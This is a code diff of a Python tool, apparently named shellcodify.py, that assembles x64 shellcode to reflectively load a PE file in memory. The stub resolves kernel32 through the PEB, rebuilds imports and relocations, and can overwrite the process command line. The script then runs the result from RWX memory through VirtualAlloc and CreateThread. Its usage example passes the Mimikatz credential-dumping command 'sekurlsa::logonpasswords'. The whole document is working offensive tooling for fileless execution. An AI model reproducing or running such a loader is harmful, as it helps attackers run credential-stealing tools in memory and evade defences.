@@ -4,29 +4,82 @@ import sys
 
 
 
-#  Remove argument line
-#  ProcessParameters = PEB + 0x20
-#  CommandLine = ProcessParameters + 0x70
-#  Buffer = CommandLine + 0x8 (wchar)
-#  Length = CommandLine + 0x0 (word)
-#
+def generate_assembly_instructions(new_cmd):
+    new_cmd_length = len(new_cmd) * 2 + 12
+    unicode_cmd = [ord(c) for c in new_cmd]
 
-CODE = (
-"find_kernel32:"
-" sub rsp, 0x8;"
+
+    fixed_instructions = [
+        "mov rsi, [rax + 0x20]; # RSI = Address of ProcessParameter",
+        "add rsi, 0x70; # RSI points to CommandLine member",
+        f"mov byte ptr [rsi], {new_cmd_length}; # Set Length to the length of new commandline",
+        "mov byte ptr [rsi+2], 0xff; # Set the max length of cmdline to 0xff bytes",
+        "mov rsi, [rsi+8]; # RSI points to the string",
+        "mov dword ptr [rsi], 0x002e0031; # Push '.1'",
+        "mov dword ptr [rsi+0x4], 0x00780065; # Push 'xe'",
+        "mov dword ptr [rsi+0x8], 0x00200065; # Push ' e'"
+    ]
+
+
+    start_offset = 0xC
+    dynamic_instructions = []
+    for i, char in enumerate(unicode_cmd):
+        hex_char = format(char, '04x')
+        offset = start_offset + (i * 2) 
+        if i % 2 == 0:
+            dword = hex_char
+        else:
+            dword = hex_char + dword 
+            instruction = f"mov dword ptr [rsi+0x{offset-2:x}], 0x{dword};"
+            dynamic_instructions.append(instruction)
+
+    if len(unicode_cmd) % 2 != 0:
+        instruction = f"mov word ptr [rsi+0x{offset:x}], 0x{dword};"
+        dynamic_instructions.append(instruction)
+
+
+    final_offset = start_offset + len(unicode_cmd) * 2
+    dynamic_instructions.append(f"mov byte ptr [rsi+0x{final_offset:x}], 0;")
+
+
+    instructions = fixed_instructions + dynamic_instructions
+    return "\n".join(instructions)
+
+
+def read_pe_file(file_path):
+    with open(file_path, 'rb') as file:
+        return bytearray(file.read())
+
+def print_byte_array(byte_array, line_length=20, max_lines=20):
+    for i in range(min(max_lines, len(byte_array) // line_length)):
+        line = byte_array[i * line_length:(i + 1) * line_length]
+        formatted_line = ''.join([f"\\x{b:02x}" for b in line])
+        print(f"buf += b\"{formatted_line}\"")
+    print("......"+str(len(byte_array)-400) +" more bytes......")
+
+
+
+
+if __name__ == "__main__":
+    if len(sys.argv)!=3:
+        print("Usage: python3 shellcodify.py calc.bin \"sekurlsa::logonpasswords\"")
+    pe_file_path = sys.argv[1]
+    pe_array = read_pe_file(pe_file_path)
+    new_cmd = sys.argv[2]
+    update_cmdline_asm = generate_assembly_instructions(new_cmd)
+
+
+    CODE = (
+"start:"
+" and rsp, 0xFFFFFFFFFFFFFFF0;"		# Stack alignment
 " xor rdx, rdx;"
 " mov rax, gs:[rdx+0x60];"		# RAX = PEB Address
 
-
-" mov rsi, [rax + 0x20];"		# RSI = Address of ProcessParameter
-" add rsi, 0x70;"			# RSI points to CommandLine member
-" mov byte ptr [rsi], 0;"		# Set Length to 0
-" mov rsi, [rsi+8];"			# RSI points to the string
-" mov byte ptr [rsi], 0;"		# Set Buffer to 0 0x13 bytes 
+"update_cmdline:"
+f"{update_cmdline_asm}"
 
 
-
-
+"find_kernel32:"
 " mov rsi,[rax+0x18];"			# RSI = Address of _PEB_LDR_DATA
 " mov rsi,[rsi + 0x30];"		# RSI = Address of the InInitializationOrderModuleList
 " mov r9, [rsi];"			# python.exe
@@ -89,12 +142,20 @@ CODE = (
 " mov r8d, 0x7c0dfcaa;"			# GetProcAddress Hash
 " call parse_module;"			# Search GetProcAddress's address
 " mov r13, rax;"			# R13 stores the address of GetProcAddress function
+)
 
 
+    ks = Ks(KS_ARCH_X86, KS_MODE_64)
+    encoding, count = ks.asm(CODE)
+    CODE_LEN = len(encoding) + 13    
+    CODE_OFFSET = 4096 - CODE_LEN
+
+
+    CODE2 = (
 "fix_iat:"  				# Init necessary variable for fixing IAT
 " xor rsi, rsi;"
 " xor rdi, rdi;"
-" lea rbx, [rip+0x1fc];"		# RBX points to PE part of shellcode, now 346 bytes in total
+f"lea rbx, [rip+{CODE_OFFSET}];"
 " xor rax, rax;"
 " mov eax, [rbx+0x3c];"   		# EAX contains e_lfanew
 " add rax, rbx;"          		# RAX points to NT Header
@@ -213,7 +274,6 @@ CODE = (
 " and rdx, r9;"				# RDX = Ordinal number
 " call r13;"				# Call GetProcAddress with ordinal
 
-
 "update_delayed_iat:"
 " mov rcx, rbp;"			# Restore module base address
 " mov r8, r15;"				# Restore current IAT address + processed
@@ -227,7 +287,6 @@ CODE = (
 "next_delayed_module:"
 " add rsi, 0x20;"			# Move to next delayed imported module
 " jmp loop_delayed_module;"		# Continue loop
-
 
 "delayed_module_loop_end:"
 
@@ -254,9 +313,6 @@ CODE = (
 " mov r9d, [rsi+4];"			# First block's size
 " xor rax, rax;"
 " xor rcx, rcx;"
-#" int3;"				# Have bug on sub [r8], r14
-" nop;"	
-
 
 "loop_reloc_block:"
 " cmp rsi, rdi;"          		# Compare current block with the end of BaseReloc
@@ -296,76 +352,66 @@ CODE = (
 " add rsi, 2;"				# Directly skip this entry
 
 "next_block:"
-#" add rsi, 2;"				# Jump to the block size field of next block
 " jmp loop_reloc_block;"
 
 "reloc_fixed_end:"
-" sub rsp,8;"                   		# 
-" nop;"
-" nop;"
-" nop;"
-" nop;"
-" nop;"
-#" nop;"
-#" nop;"
-#" nop;"
+" sub rsp, 0x8;"			# Stack alignment
+
+#"fix_tlscallbacks:"
+#" xor rax, rax;"
+#" mov eax, [rbx+0x3c];"		# EAX contains e_lfanew
+#" add rax, rbx;"			# RAX points to NT Header
+#" mov esi, [rax+0xd0];"		# ESI = TLS Table RVA
+#" test esi, esi;"			# If RVA = 0?
+#" jz all_completed;"			# Skip TLS table fix
+#" add rsi, rbx;"			# RSI points to TLSDir
+#" mov r8, [rsi+0x18];"			# R8 = AddressOfCallBacks
+
+
+"all_completed:"    
+#" int3;"             		# 
 " jmp r15;"
 )
 
-
-def read_pe_file(file_path):
-    with open(file_path, 'rb') as file:
-        return bytearray(file.read())
-
-def print_byte_array(byte_array, line_length=20, max_lines=30):
-    for i in range(min(max_lines, len(byte_array) // line_length)):
-        line = byte_array[i * line_length:(i + 1) * line_length]
-        formatted_line = ''.join([f"\\x{b:02x}" for b in line])
-        print(f"buf += b\"{formatted_line}\"")
-    print("......"+str(len(byte_array)-600) +" more bytes......")
-
-if len(sys.argv)!=2:
-        print("Usage: python3 shellcodify.py calc.bin")
-pe_file_path = sys.argv[1]
-pe_array = read_pe_file(pe_file_path)
+    ks2 = Ks(KS_ARCH_X86, KS_MODE_64)
+    encoding2, count2 = ks.asm(CODE2)
+    encoding = encoding + encoding2
 
 
-ks = Ks(KS_ARCH_X86, KS_MODE_64)
-encoding, count = ks.asm(CODE)
-#print("%d instructions..." % count)
 
-sh = b""
-for e in encoding:
-    sh += struct.pack("B", e)
-shellcode = bytearray(sh)
-print("Shellcode Stub size: "+str(len(shellcode))+" bytes")
-shellcode = shellcode + pe_array
-print("Shellcoded PE's size: "+str(len(shellcode))+" bytes")
-sc = ""
-#print("Payload size: "+str(len(encoding))+" bytes")
+    sh = b""
+    for e in encoding:
+        sh += struct.pack("B", e)
+    shellcode = bytearray(sh)
+
+    print("Shellcode Stub size: "+str(len(shellcode))+" bytes")
+
+    new_shellcode = shellcode + b"\x90"*(0x1000-len(shellcode)) + pe_array
+
+    print("Shellcoded PE's size: "+str(len(new_shellcode))+" bytes")
 
 
-print_byte_array(shellcode)
+    print_byte_array(new_shellcode)
 
 
-ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
-ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                          ctypes.c_int(len(shellcode)),
+    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
+    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                          ctypes.c_int(len(new_shellcode)),
                                           ctypes.c_int(0x3000),
                                           ctypes.c_int(0x40))
 
-buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
-ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),
+    buf = (ctypes.c_char * len(new_shellcode)).from_buffer(new_shellcode)
+    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),
                                      buf,
-                                     ctypes.c_int(len(shellcode)))
-print("Shellcode located at address %s" % hex(ptr))
-input("...ENTER TO EXECUTE SHELLCODE...")
+                                     ctypes.c_int(len(new_shellcode)))
+    print("Shellcode located at address %s" % hex(ptr))
+    input("CONTINUE TO EXECUTE SHELLCODE...")
 
-ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                          ctypes.c_int(0),
                                          ctypes.c_uint64(ptr),
                                          ctypes.c_int(0),
                                          ctypes.c_int(0),
                                          ctypes.pointer(ctypes.c_int(0)))
 
-ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
